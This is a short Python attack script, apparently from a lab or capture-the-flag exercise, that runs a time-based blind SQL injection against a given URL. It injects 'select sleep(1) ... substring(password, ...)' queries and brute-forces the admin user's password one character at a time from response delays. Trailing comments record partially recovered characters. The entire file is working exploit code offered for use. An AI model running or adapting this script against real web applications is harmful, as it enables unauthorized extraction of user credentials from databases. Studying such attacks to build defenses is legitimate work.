"""
Example usage: python guess_pass.py <url> <password length>
"""

from blindSQL import get_base_response_time, inject
from sys import argv
import string

if __name__ == "__main__":
    URL = argv[1]
    pass_length = int(argv[2])

def craft_query(substring, position):
    return "select sleep(1) from users where username = 'admin' and substring(password, 1, {}) = '{}'".format(position, substring)

def guess_char(pos, substring, expected_time):
    for char in string.printable: # tries every printable ascii character
        query = craft_query(substring + char, pos)
        print("trying", char, "at position", pos)
        if inject(query, expected_time, URL):
            print(pos, ":", char)
            return char
    return None

def guess_pass(base_response_time, pass_length):
    password = []
    for pos in range(1, pass_length + 1): # avoid off by one error in sql
        substring = "".join(password)
        char = guess_char(pos, substring, base_response_time)
        if char is not None:
            password.append(char)
        else:
            print("The password's {}th character was non-alphanumeric.".format(pos)) # unlikely to be at the start
            password.append("?")
    print("I think the password is", "".join(password))
    
response_time = get_base_response_time(URL)
guess_pass(response_time, pass_length)

# 1 = a
# 2 = ?
# 3 = d